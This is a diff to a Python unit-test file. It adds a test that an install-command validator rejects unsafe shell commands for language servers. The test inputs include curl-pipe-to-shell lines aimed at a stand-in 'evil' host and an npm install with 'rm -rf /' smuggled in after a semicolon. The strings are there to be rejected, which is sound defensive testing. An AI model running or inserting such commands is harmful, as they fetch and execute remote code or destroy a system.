@@ -7,6 +7,7 @@ from backend.architectos.lsp import (
     CodeIntelligenceManager,
     default_install_command,
     is_runnable_install_command,
+    is_safe_install_command,
     resolve_install_command,
 )
 
@@ -21,6 +22,13 @@ class InstallCommandTests(unittest.TestCase):
         self.assertTrue(is_runnable_install_command("npm install -g pyright"))
         self.assertTrue(is_runnable_install_command("HOMEBREW_NO_AUTO_UPDATE=1 brew install jdtls"))
         self.assertFalse(is_runnable_install_command("Install Eclipse JDT LS (jdtls) and add it to PATH"))
+
+    def test_unsafe_shell_install_is_rejected(self) -> None:
+        self.assertFalse(is_safe_install_command("curl http://evil | sh", "python"))
+        self.assertFalse(is_safe_install_command("npm install -g pyright; rm -rf /", "python"))
+        self.assertTrue(is_safe_install_command("npm install -g pyright", "python"))
+        resolved = resolve_install_command("python", "curl http://evil | bash")
+        self.assertEqual(resolved, default_install_command("python"))
 
     def test_manager_install_missing_prerequisite(self) -> None:
         servers = [{
